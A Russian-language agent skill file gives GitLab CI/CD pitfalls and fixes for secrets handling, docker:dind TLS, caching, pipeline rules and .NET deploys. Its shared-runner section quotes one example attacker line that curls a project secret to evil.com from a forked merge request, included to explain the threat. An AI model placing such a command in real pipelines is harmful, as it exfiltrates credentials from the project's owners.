---
name: gitlab-ci
description: GitLab CI/CD — оптимизация, ловушки, безопасность. Активируется при gitlab ci, pipeline, .gitlab-ci.yml, ci cd, deploy
allowed-tools: Read, Grep, Glob
---

# GitLab CI/CD — ловушки и anti-patterns

## Безопасность

### Секреты в логах
Плохо: `script: echo "Deploying with $DB_PASSWORD"` — masked переменная раскрыта через echo
Правильно: никогда не echo/print переменные. Если нужна отладка — `echo "DB_PASSWORD is set: $([ -n "$DB_PASSWORD" ] && echo yes || echo no)"`
Почему: GitLab маскирует переменную в логах, НО echo обходит маскировку. Логи видны всем с доступом к проекту

### Секреты на Shared Runner
Плохо: protected переменные на shared runner с `tags: []` — любой MR из fork может запустить pipeline
Правильно: protected + masked переменные, `rules: - if: $CI_COMMIT_BRANCH == "main"` для jobs с секретами, или dedicated runner
Почему: злоумышленник делает fork, добавляет `script: curl -X POST https://evil.com -d $SECRET`, создаёт MR — pipeline запускается с секретами проекта

### docker:dind без TLS
Плохо: `services: [docker:dind]` без `DOCKER_TLS_CERTDIR`
Правильно: `DOCKER_TLS_CERTDIR: "/certs"` + `DOCKER_HOST: "tcp://docker:2376"` + `DOCKER_TLS_VERIFY: "1"`
Почему: без TLS Docker daemon слушает на TCP без аутентификации. На shared runner другие jobs могут подключиться к вашему daemon и выполнить произвольный код

## Cache и Artifacts

### Cache и artifacts перепутаны
Плохо: `cache: paths: [bin/Release/]` (build output) + `artifacts: paths: [.nuget/packages/]` (dependencies)
Правильно: cache для dependencies (NuGet, npm), artifacts для build outputs (bin/, publish/)
Почему: cache может исчезнуть в любой момент (не гарантирован). Если build output в cache — следующий job получает пустую папку, pipeline падает. Artifacts — гарантированная передача между jobs

### Cache key без изоляции веток
Плохо: `cache: key: "global"` — все ветки разделяют один cache
Правильно: `cache: key: "$CI_COMMIT_REF_SLUG"` — cache per branch
Почему: feature-ветка обновляет пакет → cache обновляется → develop получает неожиданную версию зависимости

### Artifacts без expire_in
Плохо: `artifacts: paths: ["**/bin/Release/"]` — хранятся вечно
Правильно: `artifacts: expire_in: 1 hour` (или 1 day для отладки)
Почему: каждый pipeline оставляет артефакты → диск GitLab переполняется. 100 пайплайнов × 200MB = 20GB мусора

## Pipeline структура

### only/except вместо rules
Плохо: `only: [main, develop]` — deprecated, ограниченная логика
Правильно: `rules: - if: $CI_COMMIT_BRANCH =~ /^(main|develop)$/`
Почему: `only/except` не комбинируется (OR-логика), не поддерживает `changes:`, `exists:`, `variables`. `rules` — полный контроль: when, allow_failure, variables

### Нет needs (DAG) — всё последовательно
Плохо: `test:unit` и `test:integration` в одном stage без `needs:` — ждут ВСЕ jobs предыдущего stage
Правильно: `needs: [build]` — стартуют сразу после build, не ждут lint и другие jobs
Почему: pipeline 5 stages × 3 jobs = 15 последовательных шагов вместо DAG-графа. Pipeline 20 мин вместо 8

### interruptible не выставлен
Плохо: push → pipeline запускается → ещё push → ОБА pipeline работают параллельно
Правильно: `interruptible: true` на всех non-deploy jobs + Auto-cancel redundant pipelines в настройках
Почему: 5 push за 10 минут = 5 параллельных pipeline, shared runner перегружен, все ждут в очереди

## .NET специфика

### --locked-mode без lock-файла
Плохо: `dotnet restore --locked-mode` без `packages.lock.json` в репо
Правильно: сначала `dotnet restore --use-lock-file` локально → commit `packages.lock.json` → потом `--locked-mode` в CI
Почему: `--locked-mode` без lock-файла тихо падает (exit code 1), но сообщение неочевидно. CI красный, причина непонятна

### dotnet test --no-build без предварительного build
Плохо: `dotnet test --no-build` в отдельном job без artifacts от build job
Правильно: `needs: [build]` + `artifacts: true` чтобы получить bin/ из build job
Почему: `--no-build` ожидает скомпилированные файлы. Без artifacts — `Could not find testhost` или `FileNotFoundException`

### Coverage regex не парсится
Плохо: `coverage: '/Coverage: (\d+)%/'` — regex не совпадает с форматом вывода
Правильно: проверь формат вывода `dotnet test` с coverlet → напиши regex под реальный output, например `'/Total\s+\|\s+(\d+\.?\d*)%/'`
Почему: GitLab тихо игнорирует несовпавший regex — coverage показывает 0% или пусто. Нет ошибки, нет предупреждения

## Deploy

### Deploy без manual gate на production
Плохо: автоматический deploy в production на push в main
Правильно: `when: manual` + `environment: name: production` + protected branch + required approvals
Почему: сломанный код в main = автоматически сломанный production. Manual gate даёт время на smoke test staging

### kubectl set image без rollout status
Плохо: `kubectl set image ... && echo "Done"` — job зелёный, но pods крашатся
Правильно: `kubectl set image ... && kubectl rollout status deployment/myapp --timeout=300s`
Почему: `set image` только обновляет spec. Pods могут CrashLoopBackOff, но CI уже зелёный. `rollout status` ждёт реального запуска

## Чек-лист

- Cache для dependencies, artifacts для build outputs, expire_in выставлен
- `rules:` вместо `only:/except:`, `needs:` для DAG
- `interruptible: true` на non-deploy jobs
- Protected + masked variables, без echo секретов
- docker:dind с TLS
- `--locked-mode` с `packages.lock.json` в репо
- Manual deploy в production с rollout status
